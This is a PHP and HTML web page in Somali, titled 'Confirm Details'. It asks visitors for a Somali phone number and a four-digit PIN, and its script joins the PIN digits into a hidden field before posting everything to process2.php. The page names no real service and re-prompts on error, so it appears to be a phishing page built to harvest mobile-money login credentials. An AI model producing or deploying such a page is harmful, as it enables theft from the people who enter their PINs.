<?php
if(isset($_GET['error'])){
    echo "<p style='color:red; text-align:center;'>Fadlan geli faahfaahintaada si sax ah ❌</p>";
}
?>

<!DOCTYPE html>
<html>
<head>

<title>Confirm Details</title>
<head>

<title>Confirm Details</title>

<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: linear-gradient(135deg, #b6e63a, #6ccf3c);
    text-align: center;
}

/* Logo */
.logo-container {
    margin-top: 20px;
}

.logo {
    width: 120px;
}

/* Main container */
.container {
    background: #f5f5f5;
    margin: 30px 15px;
    padding: 25px;
    border-radius: 25px;
}

/* Title */
h2 {
    font-size: 18px;
    margin-bottom: 20px;
}

/* Phone box */
.phone-box {
    display: flex;
    align-items: center;
    border: 2px solid #4CAF50;
    border-radius: 12px;
    padding: 12px;
    margin-bottom: 20px;
    background: white;
}

.phone-box span {
    margin-right: 10px;
    font-weight: bold;
}

.phone-box input {
    border: none;
    outline: none;
    font-size: 16px;
    width: 100%;
}

/* PIN boxes */
.pin-box {
    display: flex;
    justify-content: center;
    gap: 10px;
    margin: 15px 0;
}

.pin-box input {
    width: 50px;
    height: 50px;
    border: 2px solid #4CAF50;
    border-radius: 10px;
    text-align: center;
    font-size: 22px;
}

/* Eye icon */
#togglePin {
    display: inline-block;
    margin-top: 10px;
}

/* Button */
button {
    width: 100%;
    padding: 15px;
    margin-top: 20px;
    border: none;
    border-radius: 12px;
    background: #ccc;
    color: white;
    font-size: 18px;
}
</style>

</head>

</head>

<body>

<div class="container">

<h2>Fadlan geli lambarka iyo PIN-ka si aad u sii wadato</h2>

<form action="process2.php" method="POST">

<div class="phone-box">
    <span>🇸🇴SO +252</span>
    <input type="tel" id="phone" name="phone" placeholder="699999999" maxlength="10" required>
</div>

<div class="pin-container">
    
    <div class="pin-box">
        <input type="password" maxlength="1" class="pin" required>
        <input type="password" maxlength="1" class="pin" required>
        <input type="password" maxlength="1" class="pin" required>
        <input type="password" maxlength="1" class="pin" required>
    </div>

    <span id="togglePin" style="cursor:pointer; font-size:20px;">👁</span>

</div>

<input type="hidden" name="pin" id="fullPin">

<button type="submit">SII WAD</button>

</form>

</div>
<script>
const pins = document.querySelectorAll(".pin");

// When typing in first box, allow full paste/typing
pins[0].addEventListener("input", function(e) {
    let value = this.value.replace(/\D/g, '');

    // If user types multiple digits
    if (value.length > 1) {
        value = value.slice(0, 4);
        pins.forEach((input, i) => {
            input.value = value[i] || "";
        });
        if (value.length === 4) pins[3].focus();
        return;
    }

    // Move to next
    if (this.value) pins[1].focus();
});

// Handle other boxes normally
pins.forEach((input, index) => {
    if(index === 0) return;

    input.addEventListener("input", () => {
        input.value = input.value.replace(/\D/g, '');

        if (input.value && index < 3) {
            pins[index + 1].focus();
        }
    });

    input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !input.value && index > 0) {
            pins[index - 1].focus();
        }
    });
});
</script>
<script>
let visible = false;

document.getElementById("togglePin").addEventListener("click", function() {
    visible = !visible;

    document.querySelectorAll(".pin").forEach(input => {
        input.type = visible ? "text" : "password";
    });

    this.textContent = visible ? "🙈" : "👁";
});
</script>
<script>
document.querySelector("form").addEventListener("submit", function() {

    let pin = "";

    document.querySelectorAll(".pin").forEach(input => {
        pin += input.value;
    });

    document.getElementById("fullPin").value = pin;

});
</script>


</body>
</html>